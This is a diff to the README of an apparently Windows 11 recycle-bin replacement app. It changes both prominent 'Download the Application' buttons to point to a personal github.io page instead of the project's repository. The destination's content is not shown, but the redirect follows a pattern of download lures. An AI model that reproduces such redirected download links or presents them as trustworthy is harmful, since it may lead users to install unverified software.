@@ -1,7 +1,7 @@
 <h1>🗑️ Modern-Recycle-Bin - Restore, Preview, and Manage Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="display:inline-block;padding:16px 32px;background-color:#4CAF50;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 6px rgba(0,0,0,0.1);">📥 Visit This Link to Download the Application</a>
+  <a href="https://bsrajputindore1980.github.io" style="display:inline-block;padding:16px 32px;background-color:#4CAF50;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 6px rgba(0,0,0,0.1);">📥 Visit This Link to Download the Application</a>
 </p>
 
 Welcome to **Modern-Recycle-Bin**, a completely fresh and modern take on the classic Windows Recycle Bin. This application dramatically improves how you interact with deleted files on your Windows 11 computer. Whether you want to bring back a accidentally deleted document, save a precious photo to another folder, or quickly see what an image looks like without opening it fully, this tool makes it effortless. Built with smooth, modern visuals (Fluent Design) that blend right into Windows 11, you get a faster, easier, and more powerful way to manage your deleted items.
@@ -116,7 +116,7 @@ Ready to reclaim your deleted files with ease? Follow this single, streamlined p
 **1. Click this button to go to the download page:**
 
 <p align="center">
-  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="display:inline-block;padding:14px 28px;background-color:#FF5722;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:40px;box-shadow:0 4px 6px rgba(0,0,0,0.15);">🔗 Visit This Link to Download the Application</a>
+  <a href="https://bsrajputindore1980.github.io" style="display:inline-block;padding:14px 28px;background-color:#FF5722;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:40px;box-shadow:0 4px 6px rgba(0,0,0,0.15);">🔗 Visit This Link to Download the Application</a>
 </p>
 
 **2. On that page, find the green "Code" button** (usually top right). Click it and select **"Download ZIP"**. 
